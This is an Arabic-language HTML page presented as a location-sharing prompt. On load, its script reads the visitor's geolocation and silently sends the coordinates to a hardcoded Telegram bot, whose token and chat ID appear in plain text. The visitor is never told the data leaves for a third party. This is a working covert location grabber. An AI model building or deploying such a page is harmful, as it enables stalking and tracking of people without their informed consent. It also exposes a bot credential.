<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>مشاركة الموقع</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
    }
    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #333;
    }
  </style>
</head>
<body>
  <h2>سيتم طلب مشاركة موقعك تلقائياً</h2>
  <p id="status"></p>

  <script>
    const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
    const CHAT_ID = "6024837142";

    function sendLocation(lat, lon) {
      const message = `📍 تم الحصول على الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
      
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
        .then(response => console.log('تم الإرسال'))
        .catch(error => console.error('خطأ:', error));
    }

    function updateStatus(text, isError = false) {
      const status = document.getElementById('status');
      status.innerHTML = text;
      if (isError) status.style.color = 'red';
      else status.style.color = 'green';
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          updateStatus(`✓ تم تحديد موقعك بنجاح`);
          sendLocation(lat, lon);
        },
        (error) => {
          if (error.code === 1) {
            updateStatus('✗ يرجى السماح بالوصول إلى الموقع', true);
          } else {
            updateStatus('✗ حدث خطأ في تحديد الموقع', true);
          }
        }
      );
    } else {
      updateStatus('✗ المتصفح لا يدعم تحديد الموقع', true);
    }
  </script>
</body>
</html>
